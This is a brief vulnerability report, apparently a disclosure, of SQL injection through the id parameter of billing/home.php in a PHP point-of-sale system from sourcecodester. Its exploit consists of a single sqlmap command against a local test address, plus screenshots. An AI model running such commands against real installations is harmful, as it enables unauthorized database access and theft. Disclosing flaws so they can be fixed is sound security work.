vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220938975-dbee6d10-b0ef-4bec-bcf1-63b8b41e2855.png)


exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/billing/home.php?id=1"
```
![image](https://user-images.githubusercontent.com/30823782/220944050-4882843c-d488-4f63-9408-cbcf446a6f05.png)

